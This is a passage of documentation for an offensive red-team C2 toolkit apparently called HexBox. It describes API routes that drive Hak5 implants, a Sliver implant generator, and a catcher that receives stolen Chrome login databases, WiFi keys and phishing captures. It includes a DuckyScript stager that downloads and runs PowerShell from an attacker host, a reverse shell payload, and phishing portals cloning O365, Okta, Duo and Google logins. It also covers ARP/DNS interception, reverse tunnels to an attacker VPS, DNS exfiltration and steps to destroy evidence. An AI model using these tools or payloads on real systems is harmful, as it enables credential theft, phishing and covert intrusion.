| `/pineapple/monitor_mode` | POST | `{"enable": true/false}` | Toggle monitor mode |
| `/pineapple/pmkid` | POST | — | Launch hcxdumptool PMKID capture |
| `/pineapple/handshakes` | POST | — | SFTP pull .cap/.pcapng files to loot/handshakes/ |

### Shark Jack

| Endpoint | Method | Description |
|---|---|---|
| `/shark/nmap` | POST | SSH exec nmap against scan_target; save XML to loot/nmap/ |
| `/shark/arp` | POST | SSH exec arp-scan; save results |
| `/shark/loot` | POST | SFTP pull from /loot to loot/shark/ |

### Packet Squirrel

| Endpoint | Method | Description |
|---|---|---|
| `/squirrel/pcap` | POST | SSH exec: start tcpdump inline capture |
| `/squirrel/dnsspoof` | POST | SSH exec: enable DNS spoofing via dnsmasq |
| `/squirrel/arpscan` | POST | SSH exec: run arp-scan |
| `/squirrel/pull` | POST | SFTP pull PCAPs to loot/pcaps/ |

### LAN Turtle

| Endpoint | Method | Description |
|---|---|---|
| `/turtle/autossh` | POST | SSH exec: launch AutoSSH reverse tunnel to C2 VPS |
| `/turtle/responder` | POST | SSH exec: start Responder on Turtle |
| `/turtle/meterpreter` | POST | SSH exec: stage Meterpreter payload |
| `/turtle/sshpivot` | POST | SSH exec: establish SSH pivot tunnel |

### OMG Plug

| Endpoint | Method | Description |
|---|---|---|
| `/omg/payload/<type>` | POST | Build payload of type; push to OMG via SFTP |

### Bash Bunny

| Endpoint | Method | Description |
|---|---|---|
| `/bunny/status` | GET | SSH test; check arming mode |
| `/bunny/recon` | POST | SFTP push bunny_recon.sh to Switch1; trigger execution |
| `/bunny/loot` | POST | SFTP pull loot from Bash Bunny |
| `/bunny/payload/install` | POST | `{"payload":"filename","switch":1}` — Push payload to switch position |

### Flipper Zero

| Endpoint | Method | Description |
|---|---|---|
| `/flipper/status` | GET | Check serial connection on /dev/ttyACM0 |
| `/flipper/nfc` | POST | Serial: detect NFC field and tag type |
| `/flipper/rfid` | POST | Serial: read 125kHz RFID card |
| `/flipper/badusb` | POST | Serial: run BadUSB script from Flipper storage |
| `/flipper/subghz` | POST | Serial: Sub-GHz RX capture |

### Sliver C2

| Endpoint | Method | Description |
|---|---|---|
| `/sliver/status` | GET | Check sliver-server daemon status |
| `/sliver/start` | POST | Launch sliver-server with operator config |
| `/sliver/generate` | POST | `{"os":"windows","arch":"amd64","format":"exe","listener":"https://..."}` — Generate implant |
| `/sliver/sessions` | GET | List active beacon sessions |
| `/sliver/implants` | GET | List implants in loot/implants/ |
| `/sliver/download` | GET | `?file=<implant_name>` — Download generated implant |

### Evil Portal

| Endpoint | Method | Description |
|---|---|---|
| `/portal/preview` | GET | `?template=o365` — Render portal HTML with catcher IP |
| `/portal/download` | GET | `?template=o365` — Download portal HTML file |
| `/portal/deploy` | POST | `{"template":"...","catcher_ip":"..."}` — SSH push to Pineapple |
| `/portal/credentials` | GET | Parse captures.json; return phishing table |

### PCAP

| Endpoint | Method | Description |
|---|---|---|
| `/pcap/list` | GET | List PCAP files in loot/pcaps/ |
| `/pcap/analyze` | GET | `?file=<pcap_name>` — Run tshark analysis; return extracted intelligence |

### Kismet / War-Drive

| Endpoint | Method | Description |
|---|---|---|
| `/kismet/status` | GET | Daemon status + current GPS coordinates |
| `/kismet/start` | POST | Launch Kismet on management interface |
| `/kismet/networks` | GET | Poll Kismet API; return AP table |
| `/kismet/gps` | GET | Current GPS lat/lon from gpsd |
| `/kismet/export` | GET | `?format=csv|kml` — Export network data |

### BloodHound

| Endpoint | Method | Description |
|---|---|---|
| `/bloodhound/status` | GET | Test auth to BloodHound CE; list upload types |
| `/bloodhound/upload` | POST | POST BloodHound v5 JSON files to BloodHound CE REST API |
| `/bloodhound/download` | GET | `?file=<json_name>` — Download BloodHound JSON |

### Pi Local

| Endpoint | Method | Description |
|---|---|---|
| `/pi/scan` | POST | Run nmap from Pi; save XML to loot/nmap/ |
| `/pi/responder` | POST | Launch Responder daemon on wired interface |
| `/pi/bettercap` | POST | Launch bettercap ARP+DNS MITM |
| `/pi/handshake_crack` | POST | aircrack-ng on .cap files in loot/handshakes/ |
| `/pi/hashcat` | POST | hashcat NTLMv2 (-m 5600) against rockyou.txt |

### Mobile

| Endpoint | Method | Auth Required | Description |
|---|---|---|---|
| `/mobile` | GET | Yes | Read-only PWA companion dashboard; token injected server-side |
| `/mobile/manifest.json` | GET | No | PWA install manifest for home screen installation |
| `/mobile/data` | GET | Yes | Live stats: hash count, WiFi, hosts, cracked, portals, networks |

---

## 10. Module Reference

### 10.1 hexbox_c2.py

The main C2 server. A Flask application (~3,800 lines) providing the dashboard, all API
routes, background process management, SSE event broadcasting, and loot file watching.

#### Key Global State

| Variable | Type | Purpose |
|---|---|---|
| `LOOT` | `Path` | Absolute loot directory path (from config) |
| `_TOKEN` | `str` | Auth token (from `HEXBOX_TOKEN` env or auto-generated UUID4) |
| `_PROCS` | `dict` | `{name: subprocess.Popen}` — tracked background processes |
| `_CLIENTS` | `list` | SSE subscriber queues (one per connected browser) |
| `_cracked_mtime` | `float` | mtime of last-seen cracked.txt; triggers SSE on change |
| `_exfil_running` | `threading.Event` | Guards against concurrent exfil operations |
| `_EXFIL_CFG` | `dict` | Exfil config section from config.json |
| `_EXFIL_KEY_DEFAULT` | `str` | Constant for AES key placeholder detection |
| `_VALID_PROCS` | `set` | Whitelist of process names for `/stop/<name>` route |

#### Key Functions

**`broadcast(event_type: str, data: dict)`**
Puts an SSE event onto every connected client's queue. Called from the loot watcher
thread and from process start/stop events.

**`start_proc(name: str, cmd: list) -> dict`**
Launches a subprocess, registers it in `_PROCS`, broadcasts a `proc_start` SSE event,
and returns a status dict. Raises if the process name is not in `_VALID_PROCS`.

**`ssh_exec(device: str, cmd: str) -> tuple[str, str]`**
Opens a Paramiko SSH connection to the named device using credentials from config,
executes `cmd`, and returns `(stdout, stderr)`. Connection is closed after each call.

**`sftp_pull(device: str, remote_dir: str, local_dir: Path)`**
Opens a Paramiko SFTP session, recursively downloads all files from `remote_dir`
on the device into `local_dir` on the Pi. Creates local directories as needed.

**`_loot_watcher()`**
Background daemon thread started at application launch. Every 5 seconds it:
1. Walks `~/hexbox/loot/` for any file modified in the last 5 seconds
2. Broadcasts `new_loot` SSE event for each new file
3. Checks `cracked.txt` mtime; broadcasts `hash_cracked` if changed

**`_safe_name(value: str, maxlen: int = 128) -> str | None`**
Sanitizes user-supplied filenames. Uses `Path(value).name` to strip all directory
components (neutralizes `../` path traversal), then validates against
`[A-Za-z0-9_\-.]` regex. Returns `None` if invalid.

**`_require_auth()`**
Flask `before_request` hook. Checks session cookie or `X-HexBox-Token` header.
Returns 401 JSON on failure. Exempts `login`, `logout`, and `mobile_manifest` endpoints.

#### Security Constraints

- All file downloads use `path.resolve().relative_to(LOOT.resolve())` to prevent
  path traversal regardless of `_safe_name` output
- Scan targets validated via `ipaddress.ip_network(target, strict=False)`
- Sliver listener URLs validated (scheme must be http/https, no whitespace/newlines)
- `MAX_CONTENT_LENGTH = 50 * 1024 * 1024` on Flask app (50 MB upload limit)
- `SESSION_COOKIE_SAMESITE = "Strict"`, `SESSION_COOKIE_HTTPONLY = True`
- All user data in JS event handlers uses `data-*` attributes + `this.dataset`
  (never string-interpolated into onclick attributes)

---

### 10.2 catcher.py

A minimal Flask application (~148 lines) that runs on port 8000. It receives
callbacks from payloads executing on target machines. It is intentionally
unauthenticated — payloads on targets have no pre-shared secret mechanism.

**Security Note:** Port 8000 must be firewalled at the network perimeter. Only the
engagement network should be able to reach it. The dashboard on port 1337 is
fully authenticated; the asymmetry is by design.

#### Routes

**`POST /upload`** — Receives base64-encoded Chrome `Login Data` SQLite file.
Decodes and writes to `loot/creds/{hostname}_{username}_chrome.db`.
Body: `{"hostname":"...", "username":"...", "data":"<base64>"}`.

**`POST /wifi`** — Receives `netsh wlan show profile` output as plaintext text.
Writes to `loot/creds/{hostname}_wifi.txt`.
Body: `{"hostname":"...", "data":"<netsh_output>"}`.

**`POST /sysinfo`** — Receives base64-encoded JSON sysinfo blob.
Decodes and writes to `loot/creds/{hostname}_sysinfo.json`.
Body: `{"hostname":"...", "data":"<base64_json>"}`.

**`POST /bloodhound`** — Receives base64-encoded BloodHound v5 JSON.
Decodes and writes to `loot/bloodhound/{hostname}_{type}.json`.
Body: `{"hostname":"...", "type":"users|computers|groups|domains", "data":"<base64>"}`.

**`POST /portal`** — Receives Evil Portal phishing captures.
Appends to `loot/portals/captures.json` as a JSON array.
Body: `{"username":"...", "password":"...", "portal":"o365", "ip":"..."}`.

**`GET /serve/<name>`** — Serves files from `payloads/` directory for stager downloads.
Used by DuckyScript payloads to download PowerShell scripts (e.g., `sysinfo.ps1`).
`_safe_name()` applied to `name` before filesystem access.

---

### 10.3 parse_loot.py

Intelligence parsing library (~478 lines). All functions take filesystem paths
and return structured Python dicts/lists. Used by `/intel/*` dashboard routes
and the report generator.

#### `parse_responder_hashes(log_path: Path) -> list[dict]`

Reads Responder log file(s). Extracts NTLMv1 and NTLMv2 hashes via regex patterns.
Deduplicates by `(username, domain, hash_type)` tuple.

Returns: `[{type, user, domain, hash, ts, source}]`

#### `parse_wifi_profiles(file_path: Path) -> list[dict]`

Parses `netsh wlan show profile ... key=clear` output from `wifi_steal.ducky`.
Extracts `[SSID]` blocks and `Key Content: <plaintext>` lines.

Returns: `[{ssid, password, source}]`

#### `parse_nmap_xml(xml_path: Path) -> list[dict]`

Parses nmap `-oX` XML output. Extracts hosts, open TCP/UDP ports, service names,
product versions, and OS guesses. Infers host role from open port combinations.

Returns: `[{ip, hostname, os, role, ports:[{port, proto, state, service, product}], open_count}]`

Role inference table:

| Ports Present | Inferred Role |
|---|---|
| 88, 135, 389, 636 | Domain Controller |
| 80, 443 | Web Server |
| 9100, 515, 631 | Printer |
| 1433 | MSSQL Database |
| 3306 | MySQL Database |
| 5432 | PostgreSQL Database |
| 22 | Linux/SSH Server |
| 3389 | RDP / Windows Desktop |

#### `parse_cracked_passwords(loot_dir: Path) -> list[dict]`

Reads `loot/cracks/cracked.txt`. Handles two formats:
- NTLMv2 (7 colon-separated fields): extracts user, domain, plaintext from fields 0/2/6
- Simple `HASH:plaintext` format: extracts hash and plaintext directly

Limits: caps results at 10,000 entries; skips lines longer than 4,096 bytes to
prevent memory exhaustion from malformed files.

Returns: `[{user, domain, plaintext, hash_preview, hash_type, cracked_at}]`

#### `aggregate_intel(loot_dir: Path) -> dict`

Orchestrates all parsers and returns a combined dict with keys:
`hashes`, `wifi`, `netmap`, `sysinfo`, `portal_captures`, `cracked`.
Used by the mobile `/mobile/data` endpoint and the report generator.

---

### 10.4 parse_pcap.py

PCAP analysis library (~629 lines). All analysis is performed by spawning `tshark`
subprocesses with specific display filters. Requires tshark installed on the Pi.

#### `analyze_pcap(pcap_file: Path, output_format: str = "dict") -> dict`

Main entry point. Runs all extraction functions in sequence and returns:

```python
{
    "file":       "capture.pcap",
    "protocols":  {"tcp": 4521, "http": 312, ...},    # protocol hierarchy
    "credentials": [                                   # all cred types combined
        {"type": "http_basic", "src_ip": "...", "host": "...",
         "username": "...", "password": "..."},
        {"type": "ftp", "user": "...", "pass": "..."},
        ...
    ],
    "dns_queries": [{"src_ip": "...", "query": "...", "type": "A", "answer": "..."}],
    "top_talkers": [{"src": "...", "dst": "...", "bytes": 12345}],
    "summary": {
        "total_packets": 8921,
        "credential_count": 7,
        "dns_query_count": 203
    }
}
```

#### Internal Extraction Functions

| Function | tshark Filter | Extracts |
|---|---|---|
| `_parse_http_auth` | `http.authorization` | Basic (base64 decoded) and Digest headers |
| `_parse_http_form` | `http.request.method == POST` | `application/x-www-form-urlencoded` credential fields |
| `_parse_dns_queries` | `dns.qry.name` | A and AAAA query names and responses |
| `_parse_ftp_credentials` | `ftp.request.command` | USER and PASS commands in sequence |
| `_parse_telnet_credentials` | `telnet` | Login/password prompt sequences |
| `_parse_smtp_credentials` | `smtp.auth` | AUTH LOGIN/PLAIN decoded credentials |

---

### 10.5 exfil.py

Encrypted loot exfiltration module (~237 lines). Can be used as a Python library
(imported by the dashboard) or as a standalone CLI tool.

#### Encryption

All exfiltration uses **AES-256-GCM** with a random 96-bit nonce per operation.

```
plaintext → gzip compress → AES-256-GCM encrypt
                                ↓
               nonce(12 bytes) + tag(16 bytes) + ciphertext
```

Key derivation: `SHA-256(aes_key_string)` → 32-byte key.

The nonce and authentication tag are prepended to ciphertext in binary, making
the wire format self-contained. Any receiver with the same key can verify
integrity before decrypting.

#### `package_loot(loot_dir: Path, target_file: str | None = None) -> bytes`

Creates an in-memory ZIP archive of `loot_dir` (or a single file within it).
Path containment is enforced: files are only included if they resolve within
`loot_dir.resolve()` — prevents symlink traversal.

#### `exfil_dns(payload, domain, dns_server, session_id, chunk_size=50, throttle_s=0.05)`

1. Base32-encodes the encrypted payload
2. Splits into 50-character chunks (safe as DNS labels; keeps FQDN under 253 chars)
3. Generates a random 4-byte session ID for reassembly on the receiver
4. Sends each chunk as a raw UDP DNS query:
   `{seq:04d}.{chunk_b32}.{session_id}.exfil.{domain}` → DNS A query
5. Sends a terminator packet: `done.{total}.{session_id}.exfil.{domain}`
6. 50ms throttle between packets avoids DNS rate limiting

**Receiver side:** Log DNS queries matching `*.exfil.{domain}`, reassemble by
session ID and sequence number, base32-decode, then decrypt:

```python
from Crypto.Cipher import AES
import base64, gzip, hashlib

def decrypt_exfil(raw: bytes, key_str: str) -> bytes:
    key = hashlib.sha256(key_str.encode()).digest()
    nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return gzip.decompress(cipher.decrypt_and_verify(ct, tag))
```

#### `exfil_https(payload, url, token, verify_tls=True)`

POSTs AES-256-GCM encrypted payload as base64 JSON:

```json
{
    "session": "<4-byte-hex>",
    "ts":      "1700000000",
    "data":    "<base64-encoded nonce+tag+ciphertext>",
    "size":    12345
}
```

Optional `X-HexBox-Token` header for endpoint authentication.

#### CLI Usage

```bash
# Exfil entire loot directory over HTTPS
python3 c2/exfil.py https --config config.json

# Exfil a single file over DNS
python3 c2/exfil.py dns --config config.json --file creds/HOST_wifi.txt

# With explicit loot directory
python3 c2/exfil.py https --loot /custom/loot --config config.json
```

#### Warning on Default Key

If `aes_key` in config equals `"change-me-to-32-byte-secret-key!"`, the exfil module
emits a `warnings.warn()` before proceeding. This is intentional — the traffic can be
decrypted by anyone with the source code if the default key is used.

---

## 11. Payload Reference

### 11.1 DuckyScript Payloads

DuckyScript payloads are USB HID automation scripts compatible with OMG Plug and Bash Bunny.
They execute on the **target machine** by simulating keyboard input.

All payloads:
- Use `DELAY` commands to wait for Windows to respond
- Open a hidden PowerShell window via Win+R or `cmd /k start /B`
- Use `STRING` to inject commands
- Call back to the catcher on port 8000

| File | Attack Vector | Execution Time | Loot Location |
|---|---|---|---|
| `reverse_shell.ducky` | TCP reverse shell | 5–10s | Interactive shell on operator |
| `browser_exfil.ducky` | Chrome credential extraction | 15–30s | loot/creds/{host}_chrome.db |
| `wifi_steal.ducky` | WiFi profile dump | 10–20s | loot/creds/{host}_wifi.txt |
| `sysinfo.ducky` | System profiling | 15–25s | loot/creds/{host}_sysinfo.json |
| `ad_recon.ducky` | LDAP AD enumeration | 30–60s | loot/creds/{host}_sysinfo.json |
| `bloodhound_collect.ducky` | BloodHound v5 collection | 60–120s | loot/bloodhound/{host}_*.json |

#### Stager Pattern

Most payloads use a stager download pattern to minimize the DuckyScript payload size:

```
DELAY 1000
WIN r
DELAY 300
STRING powershell -ep bypass -c "iex(iwr 'http://10.0.0.99:8000/serve/sysinfo.ps1' -UseBasicParsing)"
ENTER
```

The actual logic lives in the PowerShell file served by catcher.py.

---

### 11.2 PowerShell Payloads

#### `sysinfo.ps1` (~65 lines)

Collects Windows host intelligence and POSTs JSON to catcher `/sysinfo`.

Collected fields:
- `hostname`, `domain`, `os_version`, `architecture`
- `local_admins` — Members of the local Administrators group
- `ip_addresses` — All IPv4/IPv6 addresses on all adapters
- `network_shares` — Mapped network drives and UNC paths
- `antivirus` — Installed AV products via WMI `AntiVirusProduct`
- `running_processes` — Process name + PID list
- `domain_info` — Domain SID and role (workstation/DC)

#### `ad_recon.ps1` (~58 lines)

Enumerates Active Directory via .NET LDAP without requiring RSAT or AD module.
Uses `System.DirectoryServices.DirectorySearcher` with LDAP filters.

Collects:
- Domain users (samAccountName, distinguishedName, memberOf)
- Computers (name, OS version, lastLogonTimestamp)
- Domain Admins group members
- Domain SID and functional level

#### `bloodhound_collect.ps1` (~212 lines)

Collects BloodHound v5-format JSON data for attack path analysis.
Uses .NET LDAP and SAMR/LSARPC calls without SharpHound binary.

Collects:
- Users with SIDs, SPNs, AdminCount, enabled/disabled status
- Computers with SIDs, OS info, local admin relationships
- Groups with SIDs, members, nested group memberships
- Domains with SIDs, domain trusts, domain controllers

Output is base64-encoded and POSTed to catcher `/bloodhound` per object type.

#### `chrome.ps1` (~8 lines)

Minimal DPAPI helper called by `browser_exfil.ducky`. Reads the Chrome `Login Data`
SQLite file from `%LOCALAPPDATA%\Google\Chrome\User Data\Default\`, base64-encodes it,
and POSTs to catcher `/upload`. The file is DPAPI-encrypted on-disk but the raw bytes
can be decrypted offline using impacket's DPAPI tools with the user's domain credentials.

---

### 11.3 Bash/Shell Payloads

#### `bunny_recon.sh` (~57 lines) — Bash Bunny Switch 1

Runs on Bash Bunny in ECM_ETHERNET mode. Performs passive network enumeration
immediately on plugin.

Steps:
1. Sets `ATTACKMODE ECM_ETHERNET` to appear as USB NIC
2. Waits for DHCP assignment (reveals subnet)
3. Runs `arp-scan` on discovered subnet
4. Runs `nmap -sS -sV -T4` against /24
5. Saves results to Bash Bunny internal storage
6. POSTs JSON summary to catcher `/sysinfo` via curl

#### `bunny_exfil.sh` (~26 lines) — Bash Bunny Switch 2

HID+ECM combo attack. Runs DuckyScript credential collection then exfils via USB NIC.

#### `sharkjack_recon.sh` (~36 lines) — Shark Jack

Auto-recon on plug-in to any Ethernet port. The Shark Jack executes this payload
automatically when plugged in (not in arming mode).

Steps:
1. LED indicates attack mode (red flashing)
2. `nmap -sS -sV` against DHCP-assigned /24
3. `arp-scan` for additional hosts
4. LLDP/CDP discovery (`tcpdump -i eth0 ether proto 0x88cc`)
5. Stores results locally and optionally exfils via `nc` or `curl`

#### `squirrel_mitm.sh` (~23 lines) — Packet Squirrel

Transparent inline MITM. The Packet Squirrel sits between a device (printer, phone, PC)
and the switch without disrupting connectivity.

Steps:
1. Enable IP forwarding (`echo 1 > /proc/sys/net/ipv4/ip_forward`)
2. ARP spoof gateway and victim
3. iptables NAT rules to intercept and forward traffic
4. Optional DNS redirect to MITM_IP for phishing
5. tcpdump capture to internal storage

#### `turtle_foothold.sh` (~18 lines) — LAN Turtle

Provisions the LAN Turtle and establishes an AutoSSH reverse tunnel to the attacker VPS.

Steps:
1. Download Turtle modules via curl from Hak5 package server
2. Configure AutoSSH with VPS IP and tunnel port
3. Start autossh service (persistent, restarts on disconnect)

The reverse tunnel creates a SOCKS proxy accessible from the VPS that forwards
traffic through the target network. Requires an account on the VPS (`tunnel` user
with no shell, forced-command on authorized_keys).

---

### 11.4 Evil Portal Templates

All templates are responsive HTML5 forms styled to match the authentic service.
They POST credentials to `http://{catcher_ip}:8000/portal` and optionally redirect
the victim to the real service after submission.

| Template | Service | Phishing Scenario |
|---|---|---|
| `o365.html` | Microsoft 365 | Fake "re-authentication required" for Outlook/SharePoint |
| `okta.html` | Okta SSO | Corporate SSO portal; supports optional MFA code capture |
| `duo.html` | Duo Security | Fake MFA challenge (captures bypass code if victim enters it) |
| `google.html` | Google Workspace | Google Sign-In flow with email-first step |

**Deployment options:**
1. **Via Pineapple** — SSH push to Pineapple; served to WiFi clients associating with karma/evil twin AP
2. **Via Packet Squirrel** — DNS redirect inline MITM (victim's browser redirected to Pi serving the portal)
3. **Manual** — Download and host on any web server

---

## 12. Device Integration

### 12.1 WiFi Pineapple

**Connection:** Pi connects to Pineapple management AP (wlan0) or via USB Ethernet.
**API:** REST API on port 1471; Bearer token authentication.

| Operation | Mechanism | Notes |
|---|---|---|
| Passive recon | PineAP module API | Captures probe requests, builds client map |
| Deauth | `POST /api/wireless/deauth` | Targets specific SSID; use with caution |
| Evil portal | Evil Portal module API | Serves template to associated clients |
| Monitor mode | airmon-ng via SSH | Required for PMKID capture |
| PMKID capture | hcxdumptool via SSH | Captures PMKID without client association |
| Handshake pull | SFTP from /loot/ | Saves .cap files to loot/handshakes/ |

**Automation script:** `scripts/pineapple_auto.py` provides a standalone automation
script for pre-configured Pineapple workflows without the dashboard.

---

### 12.2 Shark Jack

**Connection:** USB-C creates a USB Ethernet adapter at 172.16.24.1.  
**Access:** SSH root@172.16.24.1

The Shark Jack is designed for rapid 2-minute recon. Plug it into any open Ethernet
port. It begins executing its payload immediately (in non-arming mode).

| HexBox Operation | Command Sent via SSH |
|---|---|
| nmap scan | `nmap -sS -sV -T4 -oX /loot/scan.xml {target}` |
| ARP scan | `arp-scan -l -I eth0` |
| Pull loot | SFTP from `/loot/` on device |

---

### 12.3 Packet Squirrel

**Connection:** USB creates USB Ethernet at 172.16.32.1.  
**Deployment:** Inline between target device and switch (transparent passthrough).  
**Access:** SSH root@172.16.32.1 (arming mode: switch to middle position).

| HexBox Operation | Effect |
|---|---|
| Start PCAP | tcpdump on br0 (bridged interface); writes to /loot/ |
| DNS Spoof | dnsmasq with custom hosts file; redirects target domains to Pi |
| ARP Scan | arp-scan through bridge; discovers hosts on both sides |
| Pull PCAPs | SFTP from /loot/ to loot/pcaps/ |

---

### 12.4 LAN Turtle

**Connection:** USB creates USB Ethernet at 172.16.84.1.  
**Deployment:** Sits between a workstation and the wall jack (persistent, power from USB).  
**Access:** SSH root@172.16.84.1 (arming mode).

| HexBox Operation | Effect |
|---|---|
| AutoSSH Tunnel | Reverse SSH tunnel to VPS; creates persistent access even after HexBox removed |
| Responder | LLMNR/NBT-NS poisoning on the workstation's network segment |
| Meterpreter | Stage Metasploit payload to execute on a nearby machine |
| SSH Pivot | Dynamic SOCKS proxy through Turtle for lateral movement |

**AutoSSH pattern:**
```
Target Network ← LAN Turtle → Pi HexBox → VPS
                                              ↑
                              Attacker connects here
```

---

### 12.5 OMG Plug

**Connection:** OMG connects to a WiFi AP (configured as HexBox hotspot); callbacks
go to Pi on port 8443 or catcher on 8000.  
**Deployment:** Into any USB wall outlet or power strip near a target machine.

The OMG Plug is a stealth HID device that looks like a USB charger. When a target
plugs a device into it or it's in-line, it executes the loaded DuckyScript payload.

| HexBox Operation | Effect |
|---|---|
| Build payload | Dashboard generates DuckyScript; SFTP pushes to OMG |
| Serve payload | catcher `/serve/<name>` delivers PowerShell via stager |
| Receive loot | catcher endpoints receive callback data |

---

### 12.6 Bash Bunny

**Connection:** USB creates USB Ethernet at 172.16.64.1.  
**Modes:** Switch position 1 = Switch1 payload, Switch2 = Switch2 payload, right = arming.  
**Access:** SSH root@172.16.64.1 (arming mode).

The Bash Bunny supports two independent payload slots. HexBox can push payloads to
either switch position via SFTP.

| HexBox Operation | Effect |
|---|---|
| Status check | SSH; check current switch position and arming mode |
| Push recon | SFTP bunny_recon.sh → /root/payloads/switch1/payload.sh |
| Pull loot | SFTP from /loot/ on device |
| Custom install | `{"payload": "filename.sh", "switch": 1}` — Push to specified position |

---

### 12.7 Flipper Zero

**Connection:** USB serial at `/dev/ttyACM0`.  
**Protocol:** Flipper CLI over serial (115200 baud, newline-terminated commands).

| HexBox Operation | Serial Command Sent | Output |
|---|---|---|
| NFC Detect | `nfc detect` | Tag type, UID, protocol |
| RFID Read | `rfid read` | Card type, UID at 125kHz |
| BadUSB Run | `badusb run /ext/badusb/<file>.txt` | Executes script from SD card |
| Sub-GHz Capture | `subghz rx` | Starts capture; raw signal data |

---

## 13. Script Reference

### `setup/hexbox_setup.sh`

**Usage:** `sudo bash setup/hexbox_setup.sh`

One-time provisioning script. **Model-aware:** auto-detects the Raspberry Pi model and
OS version, then applies model-specific configuration before installing packages.

| Detection | Action |
|---|---|
| Any model | Install base packages, Python deps, Metasploit, enable IP forwarding |
| Bookworm | Install `python3-full` (required for `--break-system-packages`) |
| Pi 4 or Pi 5 | Install `rpi-eeprom` firmware updater |
| Pi 5 only | Append `usb_max_current_enable=1` to `/boot/firmware/config.txt`; print 27W supply warning |
| All models | Install `macspoof.service` with dynamic interface enumeration (no hard-coded eth0/wlan0) |

The `macspoof.service` unit iterates all non-loopback interfaces via `/sys/class/net`
rather than hard-coding `eth0` and `wlan0`. This means it correctly randomizes MACs
on any number of USB Ethernet adapters regardless of Pi model.

---

### `scripts/engage.sh`

**Usage:** `bash scripts/engage.sh [target-network]`

One-command engagement launcher. Starts all services simultaneously and tracks
their PIDs in `logs/engage.pids` for clean shutdown.

**Services started (in order):**
1. `nmap -sS -sV -T4` against target network → `loot/engagement_{ts}/recon.*`
2. `scripts/pineapple_auto.py` → `loot/engagement_{ts}/pineapple.log`
3. `responder -I {wired_if} -wrf` → `loot/engagement_{ts}/responder.log`
4. `catcher.py` on port 8000 → `loot/engagement_{ts}/catcher.log`
5. `nc -lvnp` on ports 4444, 4445, 4446 → `loot/engagement_{ts}/shell_{port}.log`
6. `hexbox_c2.py` → `loot/engagement_{ts}/c2.log`

Waits up to 20 seconds for the dashboard to respond, then prints the access URL.
Ctrl+C triggers cleanup: SIGTERM to all tracked PIDs.

---

### `scripts/opsec.sh`

**Usage:** `bash scripts/opsec.sh`

Pre/post engagement OPSEC hardening. Run before going on-site and after extraction.

**Operations:**
1. Start Tor (if installed) for outbound traffic anonymization
2. Rotate MAC addresses on all non-loopback interfaces via macchanger `-r`
3. Spoof hostname to `DESKTOP-WIN10` via hostnamectl
4. Suppress bash history: `unset HISTFILE`, `export HISTSIZE=0`
5. GPG-encrypt loot archive: `tar czf - loot/ | gpg -c --cipher-algo AES256 > /tmp/loot_{ts}.tar.gz.gpg`
6. Shred plaintext loot files: `find loot/ -type f -exec shred -uz {} \;`

---

### `scripts/configure.sh`

**Usage:** `bash setup/configure.sh`

Interactive wizard that builds `config.json`. Run once after clone and again
whenever deployment environment changes (new engagement, different subnet, etc.).

The wizard writes config values via an embedded Python heredoc to avoid shell
injection issues with special characters in passwords. After writing, it:
- Sets config.json permissions to 600
- Propagates attacker IP from default 10.0.0.99 to all payload files via `sed`
- Patches `turtle_foothold.sh` with the VPS IP
- Patches `squirrel_mitm.sh` with the MITM DNS redirect IP

---

### `scripts/preflight.py`

**Usage:** `sudo python3 scripts/preflight.py`

See [Section 7](#7-pre-flight-validation) for full documentation.

The script automatically reads `config.json` and overlays its values onto the
internal CONFIG dict via `_apply_config_json()` — meaning you only need to
update `config.json` through `configure.sh`, not the preflight script itself.

**Pi 4/5 additions:** `check_hardware()` now runs as the second check after
`check_root()`. It:
1. Reads `/proc/device-tree/model` to detect the Pi model and logs it in the banner
2. On Pi 5: verifies `usb_max_current_enable=1` is present in the boot config; WARN if missing
3. On Pi 4/5: verifies `rpi-eeprom-update` is installed; WARN if missing
4. On non-Pi hardware: WARN that the platform is untested

The Pineapple `interface` config key is automatically set from `config.json →
interfaces.management` by `_apply_config_json()`, so it correctly follows whatever
interface name is configured (wlan0, wlan1, etc.) rather than using a hard-coded default.

---

### `scripts/pineapple_auto.py`

**Usage:** Run directly or via `engage.sh`

Standalone Pineapple automation script:
1. `login()` — POST credentials to Pineapple API; store Bearer token
2. Starts PineAP with karma mode (responds to all probe requests)
3. Enables Evil Portal if configured
4. Polls and prints probe request log every 30 seconds

---

## 14. Intelligence Collection Pipeline

### Collection → Storage → Parsing → Display

```
Source              Stored As                  Parsed By             Displayed In
──────              ─────────                  ─────────             ────────────
Responder log   →   loot/creds/               parse_responder_hashes Intel/NTLM
DuckyScript CB  →   loot/creds/*.db|txt|json  parse_wifi_profiles   Intel/WiFi
                                               parse_sysinfo         Intel/Sysinfo
Pineapple caps  →   loot/handshakes/*.cap      (hashcat pipeline)    Intel/Cracks
Squirrel PCAP   →   loot/pcaps/*.pcap          analyze_pcap          Intel/PCAP
Evil Portal     →   loot/portals/captures.json (direct JSON)         Intel/Portal
BloodHound PS   →   loot/bloodhound/*.json     parse_bloodhound_json Intel/BH
nmap scan       →   loot/nmap/*.xml            parse_nmap_xml        Intel/Netmap
hashcat output  →   loot/cracks/cracked.txt    parse_cracked_passwords Intel/Cracked
```

### Hashcat Cracking Pipeline

1. Responder captures NTLMv2 hashes to `loot/creds/` and its own log
2. Dashboard `/pi/hashcat` route:
   - Collects all NTLMv2 hashes into `loot/cracks/ntlmv2_hashes.txt`
   - Launches: `hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -o loot/cracks/cracked.txt`
3. `_loot_watcher()` detects `cracked.txt` mtime change every 5 seconds
4. Broadcasts `hash_cracked` SSE event with cracked count
5. Dashboard Intel tab auto-refreshes Cracked Passwords section

### WiFi Handshake Pipeline

1. Pineapple captures `.cap` files via hcxdumptool (PMKID) or passive collection
2. SFTP pull to `loot/handshakes/`
3. Dashboard `/pi/handshake_crack` route launches aircrack-ng against rockyou.txt
4. Or: convert to hccapx format and use hashcat `-m 22000` for faster cracking

---

## 15. Covert Exfiltration

### When to Use

Covert exfiltration is for post-engagement data removal when:
- Direct file copy is impractical or monitored
- HTTPS/DNS are the only egress channels
- Data must survive network egress filtering

### Configuration

In `config.json` → `exfil` section:

```
dns_domain:   Authoritative DNS zone you control (e.g., exfil.attacker.com)
dns_server:   Recursive resolver to route queries through (default: 8.8.8.8)
https_url:    Your receiver endpoint (e.g., https://c2.attacker.com/receive)
https_token:  Auth token sent as X-HexBox-Token header
aes_key:      32+ character key — MUST be changed from default before use
```

**CRITICAL:** Change `aes_key` from the default before any real engagement. The default
key is public and the encrypted traffic is trivially decrypted by anyone with the source.

